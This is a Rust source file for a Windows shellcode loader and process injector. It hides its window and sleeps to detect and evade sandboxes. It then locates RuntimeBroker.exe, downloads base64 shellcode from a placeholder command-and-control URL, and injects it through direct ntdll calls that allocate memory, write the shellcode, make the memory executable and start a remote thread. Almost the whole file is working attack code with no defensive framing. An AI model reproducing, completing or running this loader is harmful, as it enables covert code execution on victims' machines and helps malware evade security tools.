// NTDLL Direct Import Injector - Same technique as i5_syscall.ps1
// Layer 3: Direct ntdll.dll imports (like PS1 does)
#![windows_subsystem = "windows"]
#![allow(non_snake_case, non_camel_case_types)]

use std::ptr;
use std::mem;

type HANDLE = *mut u8;
type PVOID = *mut u8;
type DWORD = u32;
type ULONG = u32;
type NTSTATUS = i32;
type BOOL = i32;
type SIZE_T = usize;

#[repr(C)]
struct OBJECT_ATTRIBUTES {
    Length: ULONG,
    RootDirectory: HANDLE,
    ObjectName: PVOID,
    Attributes: ULONG,
    SecurityDescriptor: PVOID,
    SecurityQualityOfService: PVOID,
}

#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: HANDLE,
    UniqueThread: HANDLE,
}

#[repr(C)]
struct PROCESSENTRY32W {
    dwSize: DWORD,
    cntUsage: DWORD,
    th32ProcessID: DWORD,
    th32DefaultHeapID: usize,
    th32ModuleID: DWORD,
    cntThreads: DWORD,
    th32ParentProcessID: DWORD,
    pcPriClassBase: i32,
    dwFlags: DWORD,
    szExeFile: [u16; 260],
}

// Kernel32 for process enumeration
#[link(name = "kernel32")]
extern "system" {
    fn CreateToolhelp32Snapshot(flags: DWORD, pid: DWORD) -> HANDLE;
    fn Process32FirstW(snap: HANDLE, pe: *mut PROCESSENTRY32W) -> BOOL;
    fn Process32NextW(snap: HANDLE, pe: *mut PROCESSENTRY32W) -> BOOL;
    fn CloseHandle(h: HANDLE) -> BOOL;
    fn Sleep(ms: DWORD);
    fn GetTickCount64() -> u64;
}

// NTDLL - Direct imports (same as PS1 DllImport)
#[link(name = "ntdll")]
extern "system" {
    fn NtOpenProcess(
        ProcessHandle: *mut HANDLE,
        DesiredAccess: ULONG,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
        ClientId: *mut CLIENT_ID
    ) -> NTSTATUS;
    
    fn NtAllocateVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: *mut PVOID,
        ZeroBits: usize,
        RegionSize: *mut SIZE_T,
        AllocationType: ULONG,
        Protect: ULONG
    ) -> NTSTATUS;
    
    fn NtWriteVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: PVOID,
        Buffer: *const u8,
        NumberOfBytesToWrite: SIZE_T,
        NumberOfBytesWritten: *mut SIZE_T
    ) -> NTSTATUS;
    
    fn NtProtectVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: *mut PVOID,
        RegionSize: *mut SIZE_T,
        NewProtect: ULONG,
        OldProtect: *mut ULONG
    ) -> NTSTATUS;
    
    fn NtCreateThreadEx(
        ThreadHandle: *mut HANDLE,
        DesiredAccess: ULONG,
        ObjectAttributes: PVOID,
        ProcessHandle: HANDLE,
        StartRoutine: PVOID,
        Argument: PVOID,
        CreateFlags: ULONG,
        ZeroBits: SIZE_T,
        StackSize: SIZE_T,
        MaximumStackSize: SIZE_T,
        AttributeList: PVOID
    ) -> NTSTATUS;
}

// WinINet for HTTP
#[link(name = "wininet")]
extern "system" {
    fn InternetOpenA(agent: *const u8, access: DWORD, proxy: *const u8, bypass: *const u8, flags: DWORD) -> HANDLE;
    fn InternetOpenUrlA(inet: HANDLE, url: *const u8, headers: *const u8, len: DWORD, flags: DWORD, ctx: usize) -> HANDLE;
    fn InternetReadFile(file: HANDLE, buf: PVOID, size: DWORD, read: *mut DWORD) -> BOOL;
    fn InternetCloseHandle(h: HANDLE) -> BOOL;
}

// URL placeholder
static URL: &[u8] = b"https://PLACEHOLDER_C2_URL/payloads/shellcode.txt\0";

// Find RuntimeBroker PID
unsafe fn find_runtime_broker() -> DWORD {
    let target: [u16; 18] = [
        'R' as u16, 'u' as u16, 'n' as u16, 't' as u16, 'i' as u16, 'm' as u16, 'e' as u16, 
        'B' as u16, 'r' as u16, 'o' as u16, 'k' as u16, 'e' as u16, 'r' as u16, '.' as u16,
        'e' as u16, 'x' as u16, 'e' as u16, 0u16
    ];
    
    let snap = CreateToolhelp32Snapshot(0x2, 0);
    if snap as isize == -1 { return 0; }
    
    let mut pe: PROCESSENTRY32W = mem::zeroed();
    pe.dwSize = mem::size_of::<PROCESSENTRY32W>() as DWORD;
    
    let mut pid = 0u32;
    if Process32FirstW(snap, &mut pe) != 0 {
        loop {
            let mut match_found = true;
            for i in 0..target.len() {
                if pe.szExeFile[i] != target[i] {
                    match_found = false;
                    break;
                }
            }
            if match_found {
                pid = pe.th32ProcessID;
                break;
            }
            if Process32NextW(snap, &mut pe) == 0 { break; }
        }
    }
    CloseHandle(snap);
    pid
}

// Download and decode base64 shellcode
unsafe fn download_shellcode() -> Vec<u8> {
    let inet = InternetOpenA(
        b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\0".as_ptr(),
        0, ptr::null(), ptr::null(), 0
    );
    if inet.is_null() { return Vec::new(); }
    
    let conn = InternetOpenUrlA(inet, URL.as_ptr(), ptr::null(), 0, 0x80000000, 0);
    if conn.is_null() { 
        InternetCloseHandle(inet);
        return Vec::new(); 
    }
    
    let mut buf = Vec::with_capacity(0x100000);
    let mut chunk = [0u8; 8192];
    let mut read: DWORD = 0;
    
    loop {
        if InternetReadFile(conn, chunk.as_mut_ptr(), chunk.len() as DWORD, &mut read) == 0 || read == 0 {
            break;
        }
        buf.extend_from_slice(&chunk[..read as usize]);
    }
    
    InternetCloseHandle(conn);
    InternetCloseHandle(inet);
    
    decode_base64(&buf)
}

fn decode_base64(input: &[u8]) -> Vec<u8> {
    let table: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut output = Vec::with_capacity(input.len() * 3 / 4);
    let mut buf: u32 = 0;
    let mut bits: u32 = 0;
    
    for &c in input {
        let val = match table.iter().position(|&x| x == c) {
            Some(v) => v as u32,
            None => continue,
        };
        buf = (buf << 6) | val;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            output.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }
    output
}

fn main() {
    unsafe {
        // Anti-sandbox
        let t1 = GetTickCount64();
        Sleep(1500);
        if GetTickCount64() - t1 < 1000 { return; }
        
        // Find target
        let pid = find_runtime_broker();
        if pid == 0 { return; }
        
        // Download shellcode
        let shellcode = download_shellcode();
        if shellcode.is_empty() { return; }
        
        // Open process - EXACTLY like PS1
        let mut handle: HANDLE = ptr::null_mut();
        let mut oa: OBJECT_ATTRIBUTES = mem::zeroed();
        oa.Length = mem::size_of::<OBJECT_ATTRIBUTES>() as ULONG;
        let mut cid: CLIENT_ID = mem::zeroed();
        cid.UniqueProcess = pid as HANDLE;
        
        let status = NtOpenProcess(&mut handle, 0x1FFFFF, &mut oa, &mut cid);
        if status != 0 || handle.is_null() { return; }
        
        // Allocate RW memory
        let mut base: PVOID = ptr::null_mut();
        let mut size: SIZE_T = shellcode.len();
        let status = NtAllocateVirtualMemory(handle, &mut base, 0, &mut size, 0x3000, 0x04);
        if status != 0 || base.is_null() { return; }
        
        // Write shellcode
        let mut written: SIZE_T = 0;
        let status = NtWriteVirtualMemory(handle, base, shellcode.as_ptr(), shellcode.len(), &mut written);
        if status != 0 { return; }
        
        // Change to RX (PAGE_EXECUTE_READ = 0x20)
        let mut old_protect: ULONG = 0;
        let mut protect_base = base;
        let mut protect_size = shellcode.len();
        let status = NtProtectVirtualMemory(handle, &mut protect_base, &mut protect_size, 0x20, &mut old_protect);
        if status != 0 { return; }
        
        // Create remote thread
        let mut thread: HANDLE = ptr::null_mut();
        NtCreateThreadEx(
            &mut thread,
            0x1FFFFF,
            ptr::null_mut(),
            handle,
            base,
            ptr::null_mut(),
            0,
            0,
            0,
            0,
            ptr::null_mut()
        );
    }
}
